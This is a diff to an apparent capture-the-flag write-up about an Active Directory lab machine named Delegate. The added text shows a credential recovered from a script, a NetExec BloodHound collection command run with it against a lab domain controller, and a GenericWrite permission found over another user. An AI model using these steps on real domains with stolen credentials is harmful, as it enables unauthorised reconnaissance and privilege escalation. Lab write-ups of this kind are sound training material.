@@ -196,7 +196,7 @@ getting file \users.bat of size 159 as users.bat (0,9 KiloBytes/sec) (average 0,
 
 Inside the script we founded an interesting AD username and a password:
 
-User: `a.briggs`
+User: `A.Briggs`
 
 Password: `P4ssw0rd1#123`
 
@@ -229,4 +229,38 @@ However, it didn't work with WinRM or RDP.
 
 This means that we can use this session to gather interesting AD data with tools such as `BloodHound`.
 
+<br />
+
 ## BloodHound
+
+<br />
+
+Normally, we use `bloodhound-pyton` to the data extraction, instead of this tool, today we will use `Netexec`:
+
+<br />
+
+```bash
+❯ nxc ldap delegate.vl -u a.briggs -p 'P4ssw0rd1#123' --bloodhound -c All --dns-server 10.129.34.106
+LDAP        10.129.34.106   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.34.106   389    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123 
+LDAP        10.129.34.106   389    DC1              Resolved collection methods: trusts, session, container, rdp, localadmin, psremote, acl, objectprops, group, dcom
+LDAP        10.129.34.106   389    DC1              Done in 0M 10S
+LDAP        10.129.34.106   389    DC1              Compressing output into /home/theredp4nther/.nxc/logs/DC1_10.129.34.106_2026-01-07_204000_bloodhound.zip
+```
+
+<br />
+
+### GenericWrite 
+
+<br />
+
+Once inside BloodHound, we marked the `A.Briggs` principal as owned and the `Shortest paths from Owned objects` revealed a crytical missconfiguration:
+
+<br />
+
+![1](../../../assets/images/Delegate/1.png)
+
+<br />
+
+As we can see, the user `A.Briggs` has `GenericWrite` permissions over a user called `N.Thompson`.
+
